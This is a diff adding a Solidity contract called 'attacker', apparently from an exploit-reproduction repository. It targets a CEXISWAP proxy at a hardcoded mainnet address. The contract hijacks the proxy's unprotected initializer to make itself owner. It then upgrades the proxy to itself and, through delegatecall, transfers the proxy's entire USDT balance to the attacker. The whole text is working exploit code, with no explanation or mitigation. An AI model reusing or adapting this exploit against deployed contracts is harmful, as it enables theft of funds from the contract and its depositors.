@@ -69,3 +69,48 @@ contract Exploiter {
         }
     }
 }
+
+contract attacker {
+    ICEXISWAP private constant CEXISWAP =
+        ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);
+    IUSDT private constant USDT =
+        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    bytes32 private constant IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    address private immutable owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function initialize() external {
+        CEXISWAP.initialize(
+            "HAX",
+            "HAX",
+            address(this),
+            address(this),
+            address(this),
+            address(this)
+        );
+    }
+
+    function upgradeToAndCall() external {
+        CEXISWAP.upgradeToAndCall(
+            address(this),
+            abi.encodePacked(this.exploit2.selector)
+        );
+    }
+
+    // function 0x1de24bbf
+    function exploit2() external {
+        // delegatecall
+        USDT.transfer(owner, USDT.balanceOf(address(this)));
+    }
+
+    function upgradeTo(address newImplementation) external {
+        bytes32 slot = IMPLEMENTATION_SLOT;
+        assembly {
+            sstore(slot, newImplementation)
+        }
+    }
+}
